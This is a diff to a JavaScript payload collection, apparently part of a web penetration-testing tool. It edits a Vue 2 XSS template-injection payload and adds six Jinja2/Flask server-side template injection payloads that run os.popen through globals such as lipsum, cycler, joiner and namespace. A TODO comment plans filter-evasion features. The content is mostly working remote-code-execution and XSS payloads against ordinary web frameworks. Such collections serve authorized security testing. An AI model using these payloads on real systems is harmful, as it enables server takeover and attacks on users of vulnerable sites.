@@ -177,7 +177,7 @@ window.Payload.XSS = {
 
   Vue: {
     vue2Interpolation: value => "{{_c.constructor`alert()`()}}",
-    vue2Directive: value => "<x/v-if=_c.constructor`alert()`()>",
+    vue2Directive: value => "<x/v-=_c.constructor`alert()`()>",
     vue3Interpolation: value => "{{$emit.constructor`alert()`()}}",
     vue3DynamicComponent: value => "<component is=script text=alert()>"  
   },
@@ -202,6 +202,12 @@ window.Payload.SSTI = {
     application2RCE: value => "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
     // config2RCE Reference: https://twitter.com/realgam3/status/1184747565415358469
     config2RCE: value => "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
+    getFlashedMessages2RCE: value => "{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    self2RCE: value => "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    lipsum2RCE: value => "{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    cycler2RCE: value => "{{cycler.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    joiner2RCE: value => "{{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    namespace2RCE: value => "{{namespace.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
     addUrlRule: value => "{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}"
     // TODO: add features to bypass filter keywords like __ '' "" []
   },
